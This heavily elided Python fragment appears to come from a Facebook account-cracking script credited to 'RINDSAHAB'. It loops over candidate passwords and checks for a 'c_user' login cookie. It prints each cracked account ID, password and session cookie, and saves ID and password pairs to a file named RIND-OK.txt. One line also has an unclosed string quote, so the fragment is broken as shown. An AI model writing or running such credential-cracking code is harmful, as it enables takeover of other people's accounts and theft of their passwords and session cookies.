...
[•] AUTHOR     : \033[1;32mRINDSAHAB\033[1;37m
...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/s41m0)
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32m[RIND-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')

                open('RIND-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                ...
                # print('\033[1;33m[RIND-CP] '+uid+' | '+ps+'\x1b[1;97m')
        ...
        sys.stdout.write(f'\r[\033[1;97mRIND\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
